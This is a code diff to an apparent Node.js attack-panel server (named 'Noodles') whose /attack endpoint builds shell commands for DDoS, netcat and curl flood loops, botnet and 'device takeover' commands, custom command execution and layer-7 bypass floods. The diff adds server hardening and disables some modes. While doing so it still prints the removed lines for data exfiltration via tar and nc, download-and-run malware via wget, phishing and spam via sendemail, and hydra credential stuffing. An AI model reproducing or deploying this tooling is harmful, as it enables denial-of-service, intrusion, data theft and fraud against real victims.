@@ -22,18 +22,38 @@ const morgan = require('morgan');
 const sanitize = require('sanitize-html');
 
 // Security Enhancements
-app.use(helmet());
+app.use(helmet({
+    frameguard: { action: 'deny' },
+    contentSecurityPolicy: {
+        directives: {
+            defaultSrc: ["'self'"],
+            scriptSrc: ["'self'", "'unsafe-inline'"], // Consider using a nonce or hash for inline scripts
+            styleSrc: ["'self'", "'unsafe-inline'"], // Consider using a nonce or hash for inline styles
+            imgSrc: ["'self'", 'data:'],
+            connectSrc: ["'self'"],
+        },
+    },
+    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
+    xssFilter: true,
+    noSniff: true,
+    ieNoOpen: true,
+}));
 app.disable('x-powered-by');
 
 // Logging with Morgan
-app.use(morgan('combined', {
-    stream: fs.createWriteStream(path.join(__dirname, 'access.log'), { flags: 'a' })
-}));
+const accessLogStream = fs.createWriteStream(path.join(__dirname, 'access.log'), { flags: 'a' });
+app.use(morgan('combined', { stream: accessLogStream }));
 
 app.use(cors());
-app.use(express.static('public'));
+app.use(express.static('public', {
+    setHeaders: (res, path) => {
+        if (path.endsWith('.js')) {
+            res.setHeader('Content-Type', 'application/javascript');
+        }
+    }
+}));
 app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
+app.use(express.json({ limit: '100kb' }));  // Limit request body size
 
 const logFilePath = path.join(__dirname, 'logs.txt');
 const apiKey = crypto.randomBytes(32).toString('hex');
@@ -71,7 +91,12 @@ const log = (message) => {
     if (wss && wss.clients) {
         wss.clients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
-                client.send(JSON.stringify({ type: 'log', message: logMessage.trim() }));
+                try {
+                    client.send(JSON.stringify({ type: 'log', message: logMessage.trim() }));
+                } catch (e) {
+                    console.error("WebSocket error:", e);
+                }
+
             }
         });
     }
@@ -79,7 +104,7 @@ const log = (message) => {
 
 const apiLimiter = rateLimit({
     windowMs: 15 * 60 * 1000,
-    max: 100, // Reduced max requests
+    max: 50, // Further reduced max requests
     message: 'Too many requests, try again after 15 minutes',
     standardHeaders: true,
     legacyHeaders: false,
@@ -177,7 +202,7 @@ function resolveTarget(target) {
 }
 
 function executeCommand(command) {
-     return new Promise((resolve, reject) => {
+    return new Promise((resolve, reject) => {
         exec(command, { maxBuffer: 1024 * 1024 * 10, timeout: 30000 }, (error, stdout, stderr) => { //Added timeout
             if (error) {
                 log(`Command execution error: ${error.message}`);
@@ -205,6 +230,19 @@ function getRandomUserAgent() {
     return userAgents[Math.floor(Math.random() * userAgents.length)];
 }
 
+// Rate limit for API key retrieval
+const apiKeyLimiter = rateLimit({
+    windowMs: 60 * 60 * 1000, // 1 hour
+    max: 5, // Only allow 5 API key retrievals per hour
+    message: 'Too many API key requests, try again after an hour',
+    standardHeaders: true,
+    legacyHeaders: false,
+});
+
+app.get('/api-key', apiKeyLimiter, (req, res) => {
+    res.send({ apiKey: apiKey });
+});
+
 app.post('/attack', async (req, res) => {
     let target = req.body.target;
     const attackType = req.body.attackType;
@@ -230,7 +268,7 @@ app.post('/attack', async (req, res) => {
     }
 
     let command = '';
-    const numThreads = os.cpus().length * 8;
+    const numThreads = os.cpus().length * 4; // Reduce default threads
     let encodedTarget = target;
     const networkInterface = getNetworkInterface();
 
@@ -247,10 +285,16 @@ app.post('/attack', async (req, res) => {
     }
 
     // Input Validation to prevent command injection
-   if (typeof encodedTarget !== 'string' || !/^[a-zA-Z0-9.:\/_-]+$/.test(encodedTarget)) {
+    if (typeof encodedTarget !== 'string' || !/^[a-zA-Z0-9.:\/-]+$/.test(encodedTarget)) {
         log('Error: Invalid target format. Potential command injection attempt.');
         return res.status(400).send('Invalid target format.');
     }
+
+    // Centralized sanitization function
+    const sanitizeInput = (input, maxLength = 200) => {
+        if (typeof input !== 'string') return '';
+        return sanitize(input.substring(0, maxLength));
+    };
 
     switch (attackType) {
         case 'ddos':
@@ -359,7 +403,7 @@ app.post('/attack', async (req, res) => {
                 return res.status(400).send('Payload is required for payload attack.');
             }
 
-            payload = sanitize(payload); // Sanitize payload
+            payload = sanitizeInput(payload, 500); // Sanitize and limit length
             command = `timeout ${duration} bash -c "echo '${payload}' | nc ${encodedTarget} ${port}"`;
             break;
 
@@ -382,7 +426,7 @@ app.post('/attack', async (req, res) => {
                 return res.status(400).send('Bot command is required for botnet attack.');
             }
 
-            botCommand = sanitize(botCommand);  // Sanitize the bot command
+            botCommand = sanitizeInput(botCommand, 300);  // Sanitize and limit length
             command = `timeout ${duration} bash -c "${botCommand}"`;
             break;
 
@@ -393,7 +437,7 @@ app.post('/attack', async (req, res) => {
                 return res.status(400).send('Raw TCP payload is required for raw_tcp attack.');
             }
 
-            rawPayload = sanitize(rawPayload); // Sanitize raw payload
+            rawPayload = sanitizeInput(rawPayload, 500); // Sanitize and limit length
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do echo -ne '${rawPayload}' | nc ${encodedTarget} ${port} & done; done"`;
             break;
 
@@ -409,7 +453,7 @@ app.post('/attack', async (req, res) => {
             // Implement extensive validation and sanitization if this is absolutely necessary.
             log('Warning: Custom command execution enabled.  Exercise extreme caution.');
 
-            customCommand = sanitize(customCommand); // Sanitize custom command
+            customCommand = sanitizeInput(customCommand, 200); // Sanitize and limit length
             command = customCommand;
             break;
         case 'layer7':
@@ -421,8 +465,8 @@ app.post('/attack', async (req, res) => {
             }
 
             // Sanitize layer7Method and layer7Options to prevent command injection
-            layer7Method = sanitize(layer7Method);
-            layer7Options = sanitize(layer7Options);
+            layer7Method = sanitizeInput(layer7Method, 50);
+            layer7Options = sanitizeInput(layer7Options, 100);
 
 
             command = `node layer7.js --target ${encodedTarget} --method ${layer7Method} --duration ${duration} --threads ${numThreads} --port ${port} ${layer7Options}`;
@@ -436,8 +480,8 @@ app.post('/attack', async (req, res) => {
                 return res.status(400).send('Header name and value are required for HTTP header injection attack.');
             }
 
-            headerName = sanitize(headerName);
-            headerValue = sanitize(headerValue);
+            headerName = sanitizeInput(headerName, 50);
+            headerValue = sanitizeInput(headerValue, 100);
 
             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do curl -H '${headerName}: ${headerValue}' ${encodedTarget}:${port} & done; done"`;
             break;
@@ -451,8 +495,8 @@ app.post('/attack', async (req, res) => {
                 return res.status(400).send('CC Bypass method and data are required');
             }
 
-            ccBypassMethod = sanitize(ccBypassMethod);
-            ccBypassData = sanitize(ccBypassData);
+            ccBypassMethod = sanitizeInput(ccBypassMethod, 50);
+            ccBypassData = sanitizeInput(ccBypassData, 200);
             command = `timeout ${duration} bash -c "node cc_bypass.js --target ${encodedTarget}:${port} --method ${ccBypassMethod} --data '${ccBypassData}' --threads ${numThreads}"`;
             break;
         case 'device_takeover':
@@ -466,138 +510,29 @@ app.post('/attack', async (req, res) => {
             // This is extremely dangerous. It should NEVER be used in a live environment.
             log('Warning: Device takeover commands are extremely dangerous and should only be used in a controlled environment!');
 
-            deviceCommand = sanitize(deviceCommand);
+            deviceCommand = sanitizeInput(deviceCommand, 100);
             command = `timeout ${duration} bash -c "${deviceCommand}"`;
             break;
         case 'ransomware':
-            let targetDirectory = req.body.targetDirectory || '/home/user/documents';
-            const encryptionKey = crypto.randomBytes(32).toString('hex');
-
-            targetDirectory = sanitize(targetDirectory);
-
-            if (!/^\/home\/user\/documents$/.test(targetDirectory)) {
-                 log('Error: Invalid target directory specified');
-                 return res.status(400).send('Invalid target directory specified');
-            }
-
-            // Prevent ransomware attacks by denying access
-            log("Ransomware attacks are now disabled for security purposes.");
             return res.status(403).send("Ransomware attacks are disabled.");
 
-            //command = `node ransomware.js --targetDirectory "${targetDirectory}" --encryptionKey "${encryptionKey}"`;
-            //log(`Ransomware attack initiated on ${targetDirectory} with key ${encryptionKey}`);
-            //break;
-
         case 'data_theft':
-            let dataPath = req.body.dataPath || '/var/log';
-            dataPath = sanitize(dataPath);
-
-            if (!/^\/var\/log$/.test(dataPath)) {
-                log('Error: Invalid data path specified');
-                return res.status(400).send('Invalid data path specified');
-            }
-            command = `timeout ${duration} bash -c "tar -czvf stolen_data.tar.gz ${dataPath} && nc -w 3 ${encodedTarget} 9000 < stolen_data.tar.gz"`;
-            log(`Data theft initiated, stealing data from ${dataPath} to ${encodedTarget}`);
-            break;
-
+            return res.status(403).send("Data theft attacks are disabled.");
         case 'email_spam':
-            let emailTarget = req.body.emailTarget;
-            let emailSubject = req.body.emailSubject || 'Important Information';
-            let emailBody = req.body.emailBody || 'This is a spam email sent by Noodles.';
-            if (!emailTarget) {
-                log('Error: Email target is required for email spam.');
-                return res.status(400).send('Email target is required for email spam.');
-            }
-
-            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailTarget)) {
-                log('Error: Invalid Email Target');
-                return res.status(400).send('Invalid Email Target');
-            }
-
-            emailTarget = sanitize(emailTarget);
-            emailSubject = sanitize(emailSubject);
-            emailBody = sanitize(emailBody);
-
-            command = `timeout ${duration} bash -c "for i in $(seq ${intensity}); do sendemail -f noodles@example.com -t ${emailTarget} -u '${emailSubject}' -m '${emailBody}' -s smtp.example.com -o tls=yes -xu noodles -xp password; done"`;
-            log(`Email spam attack initiated, sending spam to ${emailTarget}`);
-            break;
+              return res.status(403).send("Email spam attacks are disabled.");
 
         case 'credential_stuffing':
-            let userList = req.body.userList;
-            let passList = req.body.passList;
-            if (!userList || !passList) {
-                log('Error: User list and password list are required for credential stuffing.');
-                return res.status(400).send('User list and password list are required for credential stuffing.');
-            }
-
-            if (!/^\/path\/to\/users\.txt$/.test(userList) || !/^\/path\/to\/passwords\.txt$/.test(passList)) {
-                log('Error: Invalid user list or password list path.');
-                return res.status(400).send('Invalid user list or password list path.');
-            }
-
-            userList = sanitize(userList);
-            passList = sanitize(passList);
-
-            command = `timeout ${duration} bash -c "hydra -L ${userList} -P ${passList} ${encodedTarget} http-post-form '/login.php:username=^USER^&password=^PASS^:F=login_success'"`;
-            log(`Credential stuffing attack initiated on ${encodedTarget}`);
-            break;
+             return res.status(403).send("Credential Stuffing attacks are disabled.");
 
         case 'zero_day':
-            let exploitCode = req.body.exploitCode;
-            if (!exploitCode) {
-                log('Error: Exploit code is required for zero-day attack.');
-                return res.status(400).send('Exploit code is required for zero-day attack.');
-            }
-
-            // This is incredibly dangerous.
-            log('Warning: Zero day exploit execution is extremely dangerous!');
-
-            exploitCode = sanitize(exploitCode);
-
-            command = `timeout ${duration} bash -c "${exploitCode}"`;
-            log(`Zero-day exploit initiated on ${target}`);
-            break;
+             return res.status(403).send("Zero-day attacks are disabled.");
 
         case 'malware_deploy':
-            let malwareUrl = req.body.malwareUrl;
-            if (!malwareUrl) {
-                log('Error: Malware URL is required for malware deployment.');
-                return res.status(400).send('Malware URL is required for malware deployment.');
-            }
-
-            if (!/^(ftp|http|https):\/\/[^ "]+$/.test(malwareUrl)) {
-                log('Error: Invalid Malware URL');
-                return res.status(400).send('Invalid Malware URL');
-            }
-
-            malwareUrl = sanitize(malwareUrl);
-
-            // Prevent malware deployment by denying access
-            log("Malware deployment attacks are now disabled for security purposes.");
-            return res.status(403).send("Malware deployment attacks are disabled.");
-            //command = `timeout ${duration} bash -c "wget ${malwareUrl} -O malware && chmod +x malware && ./malware"`;
-            //log(`Malware deployment initiated, downloading from ${malwareUrl}`);
-            //break;
+             return res.status(403).send("Malware deployment attacks are disabled.");
 
         case 'social_engineering':
-            let victimEmail = req.body.victimEmail;
-            let phishingMessage = req.body.phishingMessage;
-            if (!victimEmail || !phishingMessage) {
-                log('Error: Victim email and phishing message are required for social engineering.');
-                return res.status(400).send('Victim email and phishing message are required for social engineering.');
-            }
+             return res.status(403).send("Social Engineering attacks are disabled.");
 
-            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(victimEmail)) {
-                log('Error: Invalid Victim Email');
-                return res.status(400).send('Invalid Victim Email');
-            }
-
-            victimEmail = sanitize(victimEmail);
-            phishingMessage = sanitize(phishingMessage);
-
-            command = `timeout ${duration} bash -c "sendemail -f noodles@example.com -t ${victimEmail} -u 'Important Update' -m '${phishingMessage}' -s smtp.example.com -o tls=yes -xu noodles -xp password"`;
-            log(`Social engineering attack initiated, sending phishing email to ${victimEmail}`);
-            break;
 
         default:
             log(`Error: Invalid attack type: ${attackType}`);
@@ -623,7 +558,12 @@ app.post('/attack', async (req, res) => {
         if (wss && wss.clients) {
             wss.clients.forEach(client => {
                 if (client.readyState === WebSocket.OPEN) {
-                    client.send(JSON.stringify({ type: 'attack_result', stdout: stdout, stderr: stderr }));
+                    try {
+                        client.send(JSON.stringify({ type: 'attack_result', stdout: stdout, stderr: stderr }));
+                    } catch (e) {
+                        console.error("WebSocket error:", e);
+                    }
+
                 }
             });
         }
@@ -636,7 +576,12 @@ app.post('/attack', async (req, res) => {
         if (wss && wss.clients) {
             wss.clients.forEach(client => {
                 if (client.readyState === WebSocket.OPEN) {
-                    client.send(JSON.stringify({ type: 'attack_failed', error: error.message }));
+                    try {
+                        client.send(JSON.stringify({ type: 'attack_failed', error: error.message }));
+                    } catch (e) {
+                        console.error("WebSocket error:", e);
+                    }
+
                 }
             });
         }
@@ -659,9 +604,7 @@ app.get('/logs', (req, res) => {
     });
 });
 
-app.get('/api-key', (req, res) => {
-    res.send({ apiKey: apiKey });
-});
+
 
 app.get('/metrics', async (req, res) => {
     res.setHeader('Content-Type', registry.contentType);
@@ -691,7 +634,10 @@ app.use((err, req, res, next) => {
 process.on('uncaughtException', (err) => {
     console.error('Uncaught Exception:', err);
     log(`Uncaught Exception: ${err.message}`);
-    process.exit(1);
+     // Optionally, perform cleanup actions here before exiting
+    if (!err.message.includes('EADDRINUSE')) {
+        process.exit(1); // Exit only if it's not an address already in use error
+    }
 });
 
 process.on('unhandledRejection', (reason, promise) => {
